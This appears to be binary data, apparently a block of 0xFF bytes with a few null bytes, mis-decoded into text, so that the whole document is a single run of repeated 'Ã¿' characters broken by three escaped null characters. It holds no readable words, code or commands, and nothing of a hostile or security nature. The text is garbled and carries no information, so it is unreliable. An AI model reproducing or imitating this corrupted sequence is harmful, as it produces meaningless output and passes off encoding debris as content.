Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã